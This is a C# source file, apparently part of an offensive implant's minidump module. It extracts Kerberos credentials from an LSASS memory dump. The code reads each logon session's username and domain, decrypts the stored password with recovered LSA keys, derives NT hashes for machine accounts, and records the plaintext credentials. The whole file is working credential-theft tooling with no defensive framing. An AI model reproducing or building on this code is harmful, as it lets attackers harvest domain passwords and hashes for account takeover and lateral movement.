using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using MiniDumpModule.Crypto;
using MiniDumpModule.Invocation.Data;
using MiniDumpModule.Templates;
using static MiniDumpModule.Helpers;
using Native = Drone.Invocation.Data.Native;

namespace MiniDumpModule.Decryptor
{
    internal class Kerberos_
    {
        public static void FindCredentials(MiniDump minidump, kerberos.KerberosTemplate template)
        {
            foreach (var entry in minidump.Klogonlist)
            {
                if (entry == null)
                    continue;

                var luid = ReadStruct<Win32.WinNT.LUID>(GetBytes(entry.LogonSessionBytes, 72, Marshal.SizeOf(typeof(Win32.WinNT.LUID))));

                var usUserName = ReadStruct<Native.UNICODE_STRING>(GetBytes(entry.LogonSessionBytes, template.SessionCredentialOffset + template.SessionUserNameOffset, Marshal.SizeOf(typeof(Native.UNICODE_STRING))));
                var usDomain = ReadStruct<Native.UNICODE_STRING>(GetBytes(entry.LogonSessionBytes, template.SessionCredentialOffset + template.SessionDomainOffset, Marshal.SizeOf(typeof(Native.UNICODE_STRING))));
                var usPassword = ReadStruct<Native.UNICODE_STRING>(GetBytes(entry.LogonSessionBytes, template.SessionCredentialOffset + template.SessionPasswordOffset, Marshal.SizeOf(typeof(Native.UNICODE_STRING))));

                var username = ExtractUnicodeStringString(minidump, usUserName);
                var domain = ExtractUnicodeStringString(minidump, usDomain);

                minidump.BinaryReader.BaseStream.Seek(Rva2offset(minidump, (long)usPassword.Buffer), 0);
                var msvPasswordBytes = minidump.BinaryReader.ReadBytes(usPassword.MaximumLength);

                var msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.LsaKeys);

                var passDecrypted = "";
                var encoder = new UnicodeEncoding(false, false, true);
                try
                {
                    passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                }
                catch (Exception)
                {
                    passDecrypted = PrintHexBytes(msvDecryptedPasswordBytes);
                }
                //passDecrypted = Convert.ToBase64String(msvDecryptedPasswordBytes);

                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    if (msvDecryptedPasswordBytes.Length <= 1)
                        continue;

                    var krbrentry = new Kerberos();
                    krbrentry.UserName = username;

                    if (krbrentry.UserName.Contains("$"))
                    {
                        try
                        {
                            krbrentry.NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                        }
                        catch
                        {
                            krbrentry.NT = "NULL";
                        }
                    }

                    if (!string.IsNullOrEmpty(domain))
                        krbrentry.DomainName = domain;
                    else
                        krbrentry.DomainName = "NULL";

                    if (!string.IsNullOrEmpty(passDecrypted))
                        krbrentry.Password = passDecrypted;
                    else
                        krbrentry.Password = "NULL";

                    var currentlogon = minidump.LogonList.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;
                        currentlogon.Kerberos = krbrentry;
                        minidump.LogonList.Add(currentlogon);
                    }
                    else
                    {
                        currentlogon.Kerberos = krbrentry;
                    }
                }
            }
        }
    }
}